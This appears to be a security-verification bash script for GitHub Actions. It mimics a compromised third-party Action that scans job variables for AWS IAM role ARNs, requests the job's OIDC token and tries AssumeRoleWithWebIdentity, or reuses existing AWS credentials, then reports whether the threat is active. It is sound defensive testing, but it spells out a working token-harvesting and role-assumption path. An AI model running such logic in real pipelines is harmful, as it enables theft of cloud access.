#!/usr/bin/env bash
# Threat 2 verification: scan env, secrets, and vars for IAM role ARNs, then
# try AssumeRoleWithWebIdentity for each. Does not print tokens or secret keys.
# Only calls sts get-caller-identity after a successful assume or credential reuse.

set -u

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "=== Threat 2 verification (supply-chain token path) ==="
echo "This Action mimics a compromised third-party Action in the same job."
echo "It scans job environment variables for IAM role ARNs."
echo "GitHub has no workflow permission that lets an Action read unmapped secrets or vars."
echo

oidc_endpoint=0
if [[ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" && -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]]; then
  oidc_endpoint=1
  echo "OIDC request endpoint: available"
else
  echo "OIDC request endpoint: not available"
  echo "The job probably does not have permissions.id-token: write."
fi

existing_creds=0
if [[ -n "${AWS_ACCESS_KEY_ID:-}" && -n "${AWS_SECRET_ACCESS_KEY:-}" ]]; then
  existing_creds=1
  echo "Existing AWS credentials in environment: yes (post-assume path)"
else
  echo "Existing AWS credentials in environment: no"
fi

REGION="${AWS_REGION:-${AWS_DEFAULT_REGION:-eu-west-2}}"
echo

echo "Scanning job environment variables and GITHUB_ENV for IAM role ARNs..."
arn_json="$(python3 "${SCRIPT_DIR}/find_role_arns.py" 2>/tmp/threat2-scan.err || true)"
if [[ -s /tmp/threat2-scan.err ]]; then
  cat /tmp/threat2-scan.err
fi
rm -f /tmp/threat2-scan.err

arn_count="$(
  printf '%s' "${arn_json}" | python3 -c 'import json,sys
raw=sys.stdin.read().strip()
if not raw:
    print(0)
    raise SystemExit
print(len(json.loads(raw)))
'
)"

if [[ "${arn_count}" -eq 0 ]]; then
  echo "IAM role ARNs found: 0"
else
  echo "IAM role ARNs found: ${arn_count}"
  printf '%s' "${arn_json}" | python3 -c '
import json, sys
for item in json.loads(sys.stdin.read()):
    sources = ", ".join(item["sources"])
    print("- %s (from %s)" % (item["arn"], sources))
'
fi
echo

oidc_obtained=0
oidc_token=""
if [[ "${oidc_endpoint}" -eq 1 ]]; then
  request_url="${ACTIONS_ID_TOKEN_REQUEST_URL}"
  separator="?"
  if [[ "${request_url}" == *"?"* ]]; then
    separator="&"
  fi
  request_url="${request_url}${separator}audience=sts.amazonaws.com"

  token_json="$(
    curl -sS \
      -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
      -H "Accept: application/json; api-version=2.0" \
      "${request_url}" || true
  )"

  oidc_token="$(
    printf '%s' "${token_json}" | python3 -c '
import json, sys
raw = sys.stdin.read()
try:
    data = json.loads(raw)
except json.JSONDecodeError:
    raise SystemExit(0)
value = data.get("value") or data.get("token") or ""
if value:
    sys.stdout.write(value)
'
  )"

  if [[ -n "${oidc_token}" ]]; then
    oidc_obtained=1
    echo "OIDC token obtained: yes"
  else
    echo "OIDC token obtained: no"
    echo "GitHub did not return a token. Check id-token: write on this job."
  fi
fi

assume_ok=0
assumed_any_arn=""
identity_ok=0

try_assume() {
  local role_arn="$1"
  local assume_json err_file
  err_file="$(mktemp)"
  assume_json="$(
    aws sts assume-role-with-web-identity \
      --role-arn "${role_arn}" \
      --role-session-name threat2-supply-chain-verify \
      --web-identity-token "${oidc_token}" \
      --duration-seconds 900 \
      --region "${REGION}" \
      --output json 2>"${err_file}" || true
  )"

  if [[ -z "${assume_json}" ]]; then
    echo "AssumeRoleWithWebIdentity: denied or failed"
    if [[ -s "${err_file}" ]]; then
      echo "STS error:"
      cat "${err_file}"
    fi
    rm -f "${err_file}"
    return 1
  fi
  rm -f "${err_file}"

  echo "AssumeRoleWithWebIdentity: success"
  echo "Calling sts get-caller-identity only..."
  (
    eval "$(
      printf '%s' "${assume_json}" | python3 -c '
import json, shlex, sys
data = json.loads(sys.stdin.read())
creds = data.get("Credentials") or {}
mapping = {
    "AWS_ACCESS_KEY_ID": creds.get("AccessKeyId"),
    "AWS_SECRET_ACCESS_KEY": creds.get("SecretAccessKey"),
    "AWS_SESSION_TOKEN": creds.get("SessionToken"),
}
for key, value in mapping.items():
    if value:
        print("export %s=%s" % (key, shlex.quote(value)))
'
    )"
    aws sts get-caller-identity --region "${REGION}"
  )
}

if [[ "${oidc_obtained}" -eq 1 && "${arn_count}" -gt 0 ]]; then
  echo
  echo "Attempting AssumeRoleWithWebIdentity for each discovered role ARN..."
  while IFS= read -r role_arn; do
    [[ -z "${role_arn}" ]] && continue
    echo
    echo "Role: ${role_arn}"
    if try_assume "${role_arn}"; then
      assume_ok=1
      assumed_any_arn="${role_arn}"
      identity_ok=1
    fi
  done < <(
    printf '%s' "${arn_json}" | python3 -c '
import json, sys
for item in json.loads(sys.stdin.read()):
    print(item["arn"])
'
  )
elif [[ "${oidc_obtained}" -eq 1 && "${arn_count}" -eq 0 ]]; then
  echo
  echo "OIDC token was obtained, but no IAM role ARN was found in the job environment."
fi

unset oidc_token

if [[ "${existing_creds}" -eq 1 ]]; then
  echo
  echo "Calling sts get-caller-identity with existing job credentials..."
  if aws sts get-caller-identity --region "${REGION}"; then
    identity_ok=1
  fi
fi

echo
echo "=== Result ==="
if [[ "${assume_ok}" -eq 1 ]]; then
  echo "THREAT ACTIVE: a third-party Action obtained an OIDC token and assumed at least one role ARN from the job environment."
  echo "Example role: ${assumed_any_arn}"
elif [[ "${existing_creds}" -eq 1 && "${identity_ok}" -eq 1 ]]; then
  echo "THREAT ACTIVE: AWS credentials were already in the job environment. A later Action can reuse them."
elif [[ "${oidc_obtained}" -eq 1 && "${arn_count}" -gt 0 ]]; then
  echo "PARTIAL: OIDC token and role ARNs were available. Role assume did not succeed in this run."
elif [[ "${oidc_obtained}" -eq 1 ]]; then
  echo "PARTIAL: a third-party Action can obtain the OIDC token. No IAM role ARN was found to assume."
else
  echo "NOT CONFIRMED: this job did not give a third-party Action an OIDC token or AWS credentials."
fi
echo "Do not call other AWS APIs from this Action. Treat a successful assume as a finding."
